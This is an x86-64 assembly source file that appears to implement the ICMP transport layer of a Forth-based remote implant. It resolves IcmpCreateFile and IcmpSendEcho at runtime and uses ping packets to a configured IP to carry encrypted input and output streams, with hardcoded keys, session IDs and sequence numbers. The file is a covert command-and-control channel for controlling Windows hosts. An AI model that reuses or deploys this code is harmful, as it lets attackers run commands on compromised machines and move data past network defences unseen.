%ifndef IPADDR
	%define IPADDR 127,0,0,1
%endif	

%ifndef DELAY
	%define DELAY 5000
%endif

%ifndef WINDOW
	%define WINDOW 1000
%endif

%ifndef INKEY
	%define INKEY  `\xf1\x77\x80\x02\xea\x2a\x5f\x72\xd2\x0b\x28\x1e\x38\xa9\xc9\x4b`
%endif

%ifndef OUTKEY
	%define OUTKEY `\x1c\xab\x2b\x1d\xa7\xf8\xd7\x98\x4a\x28\x8b\x54\x58\x71\xb0\x52`
%endif
	
;;; Put a number on the stack identifying which IO engine this is.  Each IO layer
;;; needs to have its own unique ID.  This allows payloads to make decisions
;;; based on the configured IO.
	
start_def ASM, engine, "engine"
	pushthing 5
end_def engine

start_def ASM, target, "target"
	call .b
	db IPADDR
.b:	pop rax
	mov eax, [rax]
	pushthing rax
end_def target
	
;;; This function will be called before any IO is performed.  This can be used to
;;; set up streams, initialize IO layer global variables, make network connections,
;;; etc.
	
start_def ASM, initio, "initio"
	push rbp
	mov rbp, rsp
	and rsp, -16
	sub rsp, 0x60

	call .b

.a:     db "iphlpapi.dll", 0
.1:	db "IcmpCreateFile", 0
.2:	db "IcmpSendEcho", 0
.b:	pop rbx

	lea rcx, [rbx]
	call W32_LoadLibraryA
	AddGlobal G_IPHLPAPI, rax

	mov rsi, W32_GetProcAddress
	mov rdi, rax
	GetProcAddress .1 - .a, W32_IcmpCreateFile
	GetProcAddress .2 - .a, W32_IcmpSendEcho

	call W32_IcmpCreateFile	     ; get a handle for ICMP stuff
	AddGlobal G_ICMPSOCK, rax    ; store it in a global variable slot
	call W32_GetTickCount	     ; keep track if last contact time
	AddGlobal G_LASTTICK, rax    ; ...

	xor rax, rax		     ; get a zero
	AddGlobal G_MODE, rax	     ; for storing more data available
	AddGlobal G_OLEN, rax	     ; remember length of packet
	AddGlobal G_SEQ, rax	     ; sequence number

	xor ecx, ecx		     ; Let kernel choose address
	mov edx, 16384               ; buffer space
	mov r8, 0x3000		     ; Reserve and commit the space
	mov r9, 4		     ; PAGE_READWRITE permissions
	call W32_VirtualAlloc	     ; allocate space
	AddGlobal G_ICMPBUFFER, rax  ; save it here

	AddGlobal G_OUTBUF, rax	     ; save for convenience
	AddGlobal G_NEXTOUT, rax     ; output buffer is bottom 2KB
	AddGlobal G_LASTOUT, rax     ; next available space in the output buffer
	add rax, 2048		     ; input buffer is top 2KB
	AddGlobal G_INBUF, rax	     ; store for convenience
	AddGlobal G_LASTIN, rax	     ; ...
	dec rax
	AddGlobal G_NEXTIN, rax	     ; ...
	add rax, 2049		     ; 4096 bytes for packet material
	AddGlobal G_OPACKET, rax     ; for outbound packet data
	add rax, 2048		     ; ...
	AddGlobal G_IPACKET, rax     ; for inbound packet data
	add rax, 2048		     ; space for crypto state
	AddGlobal G_INSTATE, rax     ; input stream crypto state
	add rax, 512		     ; ...
	AddGlobal G_OUTSTATE, rax    ; output stream crypto state

	mov eax, DELAY		     ; ping interval
	AddGlobal G_PINGMS, rax	     ; ...
	xor eax, eax		     ; A way to keep track of bytes that don't fit
	AddGlobal G_PENDING, rax     ;
	AddGlobal G_RESPONSE, rax    ; a flag to signal when the server says there's more data to receive
	AddGlobal G_CHARBUF, rax     ; 

	InlineString INKEY, rax, rcx
	pushthing rax
	pushthing rcx
	pushthing G_INSTATE
	call code_cryptinit

	InlineString OUTKEY, rax, rcx
	pushthing rax
	pushthing rcx
	pushthing G_OUTSTATE
	call code_cryptinit

	mov rax, G_OUTBUF
	mov QWORD [rax], 0

	;; We need to get a session ID, so we'll loop until success
.loop:  call code_target	; get the target IP
	mov rcx, G_ICMPSOCK	; handle for ICMP comms
	popthing rdx		; target IP
	mov r8, G_OUTBUF	; output buffer
	mov r9, 4		; initial request is 4 zero bytes
	mov QWORD [rsp+0x20], 0	; RequestOptions
	mov rax, G_INBUF	; buffer for reply packets
	mov [rsp+0x28], rax	; ...
	mov QWORD [rsp+0x30], 1024	; size of reply buffer
	mov QWORD [rsp+0x38], 5000	; timeout
	call W32_IcmpSendEcho	; send the ping
	and rax, rax		; test result
	jz .loop		; try again if failed

	mov rax, G_INBUF	; start at beginning of buffer
	mov rax, [rax + 0x10]	; offset to data
	mov rax, [rax]		; session value
	AddGlobal G_SESSID, rax ; ...

	mov rsp, rbp
	pop rbp
end_def initio
	
;;; Take a value from the stack and emit it to the output stream as a single byte.

start_def ASM, emit, "emit"
	;; check available space
	mov rax, G_LASTOUT      ; start at the last available space
	sub rax, G_ICMPBUFFER	; subtract the base address
	cmp rax, 512		; compare to buffer size
	jl .avail		; as long as there's space, we can store
	
	;; transceive
	call icmp_transceive

	;; store a byte for output
.avail:
	mov rax, G_LASTOUT	; last byte available to store
	mov [rax], dil		; store the byte
	popthing rax		; pop from data stack
	inc QWORD G_LASTOUT	; move last output pointer

end_def emit
	
;;; Read a single byte from the input stream and put its value on top of the stkack.
	
start_def ASM, key, "key"
	;; check if bytes are currently available
	mov rax, G_NEXTIN	; compare input pointers
	mov rbx, G_LASTIN	; ...
	inc rax			; off by one otherwise
	cmp rax, rbx		; ...
	jne .avail		; as long as NEXTIN < LASTIN, there's data to read

	;; reset the input buffer
	mov rax, G_INBUF	; find input buffer base
	mov G_LASTIN, rax	; reset the pointers
	dec rax			; ...
	mov G_NEXTIN, rax	; ...
	
	;; check if we have output to send, rather than wait
	mov rcx, G_LASTOUT	; first unused space in output buffer
	sub rcx, G_ICMPBUFFER	; count bytes to send
	jnz .nodelay		; skip the delay

	;; wait for send / receive
	call icmp_delay

.nodelay:
	;; transceive
	call icmp_transceive
	jmp code_key		; loop until we have input

	;; grab a byte from input
.avail:
	inc QWORD G_NEXTIN	; move to next byte of input
	mov rax, G_NEXTIN	; get pointer to next byte
	pushthing 1		; make a spot on the stack
	mov dil, [rax]		; get the byte onto the stack

	cmp dil, 0x0a
	jne .skip
	inc QWORD G_LINENO
.skip:

end_def key

start_def ASM, keyq, "key?"
	;; check if bytes are currently available
	mov rax, G_NEXTIN	; compare input pointers
	mov rbx, G_LASTIN	; ...
	inc rax			; off by one otherwise
	cmp rax, rbx		; ...
	jne .avail		; as long as NEXTIN < LASTIN, there's data to read

	;; check how long since last check
	call W32_GetTickCount	; get our current tick count
	mov rbx, G_LASTTICK	; last time we sent
	add rbx, G_PINGMS 	; our definition of "awhile"
	sub rax, rbx		; get delta in milliseconds
	js .none		; when negative, assume no bytes
	
	;; reset the input buffer
	mov rax, G_ICMPBUFFER	; find input buffer base
	add rax, 2048		; ...
	mov G_LASTIN, rax	; reset the pointers
	dec rax			; ...
	mov G_NEXTIN, rax	; ...
	
.nodelay:
	;; transceive
	call icmp_transceive	; try one check for input
	jmp code_keyq

	;; grab a byte from input
.avail:
	pushthing 1
	ret
.none:
	pushthing 0
	ret
	
end_def keyq
	
;;; Given a buffer and length, send multiple bytes to the output stream.  This is
;;; largely provided as a convenience for situations where IO can be optimized
;;; for block communications.

start_def ASM, type, "type"
	popthing rcx
	popthing rsi

.loop:
	pushthing [rsi]
	and rdi, 0xff
	push rcx
	push rsi
	call code_emit
	pop rsi
	pop rcx
	inc rsi
	loop .loop
end_def type

;;; Enable and disable echoing of input to the output stream.  Some IO
;;; layers may prefer to allow this to be configurable.  Leave them empty
;;; if they don't make sense for your IO layer.
	
start_def ASM, echooff, "-echo"
end_def echooff

start_def ASM, echoon, "+echo"
end_def echoon

start_def ASM, setecho, "!echo"
end_def setecho


;;; ------------------------------------------------------------------------
;;; Stuff unique to this transport
;;; ------------------------------------------------------------------------

start_def ASM, pingms, "delay"
	pushthing r15
	add rdi, G_PINGMS_OFF
end_def pingms

icmp_delay:
	push rbp		; 
	mov rbp, rsp		; save stack
	sub rsp, SHADOW		; make shadow space
	and rsp, -16		; align stack just in case

	mov rcx, G_MODE		; get last response code
	and rcx, rcx		; if mode was non-zero, there's more data
	jnz .done		; skip the delay
	
.loop:
	call W32_GetTickCount	; get our current tick count
	mov rbx, G_LASTTICK	; last time we sent
	add rbx, G_PINGMS 	; our definition of "awhile"
	sub rax, rbx		; get delta in milliseconds
	jns .done		; when the number is positive, it's been long enough
	mov rcx, 500		; sleep a bit so we don't burn CPU
	call W32_Sleep		; ...
	jmp .loop
.done:
	mov rsp, rbp		; restore stack
	pop rbp			; 
	ret

icmp_transceive:
	push rbp
	xor ebp, ebp		; get a zero
	mov G_MODE, rbp		; clear the extra data flag

	mov rbp, rsp		; save stack
	sub rsp, 0x50		; make space for shadow and fns with lots of args
	and rsp, -16		; align stack in case WININET cares

	call icmp_prepare	; maybe load some bytes for output (puts count in rax)
	mov [rsp+0x48], rax	; save the count for POSTing shortly
	
.loop:  call code_target	; get the target IP
	mov rcx, G_ICMPSOCK	; handle for ICMP comms
	popthing rdx		; target IP
	mov r8, G_OPACKET	; output buffer
	mov r9, G_OLEN		; initial request is 4 zero bytes
	mov QWORD [rsp+0x20], 0	; RequestOptions
	mov rax, G_IPACKET	; buffer for reply packets
	mov [rsp+0x28], rax	; ...
	mov QWORD [rsp+0x30], 1024	; size of reply buffer
	mov rax, WINDOW			; get response window (note: different from delay interval)
	mov [rsp+0x38], rax	; timeout
	call W32_IcmpSendEcho	; send the ping
	and rax, rax		; test result
	jz .loop		; ...

	call W32_GetTickCount	; update last contact time
	mov G_LASTTICK, rax	; ...

	xor ecx, ecx		; 
	mov rax, G_IPACKET	; echo reply struct
	mov rbx, [rax + 0x10]	; payload pointer
	mov ecx, [rbx + 9]	; get length of payload
	mov al, [rbx + 8]	; get MODE field
	and eax, 0xff		; just one byte
	mov G_MODE, rax		; save MODE value

	call icmp_consume

	mov rsp, rbp
	pop rbp
	ret
	
icmp_consume:
	push rdi
	push rsi
	
	and rcx, rcx		; check if we have any to read at all
	jz .done		; and skip if it's zero

	mov rsi, rbx		; data comes from here
	add rsi, 13		; payload starts after header
	mov rdi, G_LASTIN	; data goes here -- hmm, what happens if it fills up???
	
	push rdi
	push rcx
	
	rep movsb		; move the data to the input buffer
	mov G_LASTIN, rdi	; save spot
	
	pop rcx
	pop rsi

	;; decrypt data
.go:	push rbx
	push rsi
	push rcx
	push rdi
	mov rdi, rcx
	mov rbx, G_INSTATE
	call crypt_encrypt
	pop rdi
	pop rcx
	pop rsi
	pop rbx
	
.done:	
	pop rsi
	pop rdi
	ret

icmp_prepare:
	push rdi
	mov rsi, G_OUTBUF	; start encoding bytes here
	mov rdi, G_OPACKET	; put encoded values here
	add rdi, 12		; fill in header later
	mov rcx, G_LASTOUT	; first unused space in output buffer
	sub rcx, G_OUTBUF	; count bytes to send
	jz .done		; if count is 0, we're done before we start
	
	;; encrypt the output data
.go:	push rbx
	push rsi
	push rcx
	push rdi
	mov rdi, rcx
	mov rbx, G_OUTSTATE
	call crypt_encrypt
	pop rdi
	pop rcx
	pop rsi
	pop rbx

	push rcx
	rep movsb
	pop rcx
	
.done:	push rdi
	;; fill in the header
	mov rdi, G_OPACKET
	mov rax, G_SESSID	; session ID
	mov [rdi], eax		; ...
	mov rax, G_SEQ		; get sequence number
	mov DWORD [rdi+4], eax	; sequence #
	inc QWORD G_SEQ		; increment to next
	mov [rdi+8], ecx	; length
	pop rdi

	mov rax, rdi		; save where we ended up
	sub rax, G_OPACKET	; get number of bytes to POST
	mov G_OLEN, rax		; save length for later
	
	mov rdx, G_OUTBUF	; reset output buffer since we moved it to the POST buffer
	mov G_LASTOUT, rdx	; ...

	pop rdi
	ret
	
